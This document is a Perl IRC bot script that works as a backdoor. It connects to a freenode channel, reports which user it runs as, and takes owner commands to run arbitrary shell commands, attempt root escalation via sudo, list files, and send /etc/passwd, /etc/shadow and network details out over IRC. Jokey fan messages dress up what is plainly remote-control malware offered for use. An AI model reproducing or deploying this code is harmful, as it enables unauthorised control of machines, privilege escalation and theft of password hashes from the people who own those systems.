#!/usr/bin/perl
#perl ircbot


#Server Variables!
			$rawr = int(rand(20)); 			#random number generator for the nick
			$server = "irc.freenode.net";	#server 
			$port = 6667;					#port
			$nick = "Fan$rawr";			 	#nick
			$ident = "Fan$rawr";			#ident
			$realname = "Fan$rawr";		 	#realname
			$chan = "#rawrawr";				#channel
			$pass = "";						#pass
			$su = "JustinBieber1121";		#super user
			$owners = "JustinBieber1121";	#owners




use IO::Socket;

$irc=IO::Socket::INET->new(
		PeerAddr=>$server,
		PeerPort=>$port,
		Proto=>'tcp')or die "DEAD!";
		
				
				print "$nick has connected to $server on $chan\n";
				print $irc "USER $ident $ident $ident $ident :$realname\n";
				print $irc "NICK $nick\n";
				
				#uncomment for nickserv
				#print $irc "PRIVMSG nickserv/@/services.dal.net :identify $pass\n";
				print $irc "join $chan\n";
				
				#alert the Command Center
				print $irc "PRIVMSG $owners :I AM JUSTIN BIEBER'S BIGGEST FAN\n";
				
				#Print the user the script is running as
				$output = `whoami`;
				print $irc "PRIVMSG $owners : $output\n";
			   while(defined($in=<$irc>)){
					  
						
						
						 
							### Start of commands   
						



#if($in=~/^:(.+)\!.+ JOIN\b/){print $irc "PRIVMSG $1 :hello $1 welcome to $chan\n";}

#PING PONG IS MY FAVORITE SPORT
if($in=~/PING(.*)/){print $irc "PONG :$1\n";} # MUST LEAVE THIS LINE
print "$in\n"; # AND THIS ONE


#makes bot only respond to owner
next unless $in =~ /^:$owners\b/; 




#To prevent flooding, I listed common commands as their own subroutines with sleeps. 
#If irc has no flood control, then just do !command

sub who {
if ($in=~/!whoami/)
{
	$output = `whoami`;
	print $irc "PRIVMSG $owners : $output\n";}
}

sub ifconfig {
if ($in=~/!ifconfig/)
{
	@output = `ifconfig | grep inet`;
	print $irc "PRIVMSG $owners : $output[0]\n";
	print $irc "PRIVMSG $owners : $output[1]\n";
	print $irc "PRIVMSG $owners : $output[2]\n";
	print $irc "PRIVMSG $owners : $output[3]\n";
	}
}	

sub command{
if ($in=~/!command/)
{
	
	@cmd = split(/!command/, $in);
	@output = `$cmd[1]`;
	print "@output";}
}

sub escalate{
if ($in=~/!escalate/)
{
	@pass = split(/!escalate /, $in);
	print $irc "PRIVMSG $owners : Attempting to run as ROOT!\n";
	$givemeroot = "echo \"$pass[1]\" | sudo -S perl bot.pl";
	system($givemeroot);

}
}

sub ls{
if ($in =~/!ls/)
{
	my @files = map { chomp; $_ } `find`;
	print $irc "PRIVMSG $owners : @files\n";}

}

sub passwd{
if ($in=~/!passwd/)
{
	@output = `cat /etc/passwd`;
	print $irc "PRIVMSG $owners : $output[0]\n";
	print $irc "PRIVMSG $owners : $output[1]\n";
	print $irc "PRIVMSG $owners : $output[2]\n";
	sleep(3);
	print $irc "PRIVMSG $owners : $output[3]\n";
	print $irc "PRIVMSG $owners : $output[4]\n";
	print $irc "PRIVMSG $owners : $output[5]\n";
	sleep(3);
	print $irc "PRIVMSG $owners : $output[6]\n";
	print $irc "PRIVMSG $owners : $output[7]\n";
	print $irc "PRIVMSG $owners : $output[8]\n";
	sleep(3);
	print $irc "PRIVMSG $owners : $output[9]\n";
	print $irc "PRIVMSG $owners : $output[10]\n";
	print $irc "PRIVMSG $owners : $output[11]\n";
	sleep(3);
	print $irc "PRIVMSG $owners : $output[12]\n";
	print $irc "PRIVMSG $owners : $output[13]\n";
	print $irc "PRIVMSG $owners : $output[14]\n";
	
	}
}

sub shadow {
if ($in=~/!shadow/)
{
	@output = `cat /etc/shadow`;
	print $irc "PRIVMSG $owners : $output[0]\n";
	print $irc "PRIVMSG $owners : $output[1]\n";
	print $irc "PRIVMSG $owners : $output[2]\n";
	sleep(3);
	print $irc "PRIVMSG $owners : $output[3]\n";
	print $irc "PRIVMSG $owners : $output[4]\n";
	print $irc "PRIVMSG $owners : $output[5]\n";
	sleep(3);
	print $irc "PRIVMSG $owners : $output[6]\n";
	print $irc "PRIVMSG $owners : $output[7]\n";
	print $irc "PRIVMSG $owners : $output[8]\n";
	sleep(3);
	print $irc "PRIVMSG $owners : $output[9]\n";
	print $irc "PRIVMSG $owners : $output[10]\n";
	print $irc "PRIVMSG $owners : $output[11]\n";
	sleep(3);
	print $irc "PRIVMSG $owners : $output[12]\n";
	print $irc "PRIVMSG $owners : $output[13]\n";
	print $irc "PRIVMSG $owners : $output[14]\n";
	}
}
	
sub opdeop {
if($in=~/!op /)
{print $irc "MODE $chan +o $'\n";}
if($in=~/!deop /)
{print $irc "MODE $chan -o $'\n";}
}

sub joinpart {
if($in=~/!join / & $in=~/$su/) 
{print $irc "join :$'\n";}
if($in=~/!part / & $in=~/$su/)
{print $irc "part :$'\n";}
}
				
sub kickban {
if($in=~/!kickban /)
{print $irc "kick $chan $' :I STILL LOVE YOU...FOREVER\n";}
if($in=~/!kickban /)
{print $irc "mode $chan +b $'\n";}
}

sub kick {
if($in=~/!kick /)
{print $irc "kick $chan $' :I STILL LOVE YOU\n";}
}

sub say {
if($in=~/!say /)
{print $irc "PRIVMSG $chan :$'\n";}
}
 
sub quit {
if($in=~/!quit/ & $in=~/$su/)
{print $irc "PRIVMSG $chan :I'LL BE BACK FOR YOU\n";}
if($in=~/!quit/)
{print $irc "QUIT\n";}
}

sub name {
if($in=~/!nick / & $in=~/$su/)
{print $irc "nick :$'\n";}
}

sub restart {
if($in=~/!restart/ & $in=~/$su/)
{print $irc "PRIVMSG $chan :Rehashing...\n";}
if($in=~/!restart/ & $in=~/$su/)
{print $irc "QUIT\n";}
if($in=~/!restart/ & $in=~/$su/){
system("bot.pl");}
if($in=~/!restart/ & $in=~/$su/){
print $irc "join $chan";}
}

sub viewusers {
if($in=~/!users/)
{print $irc "PRIVMSG $chan :Current admins:$owners\n";}
}


#sub calls
&who;
&ls;
&escalate;
&command;
&ifconfig
&passwd;
&shadow;
&viewusers;
&restart;
&kickban;
&say;
&name;
&kick;
&opdeop;
&joinpart;
&quit;

}
close($irc);
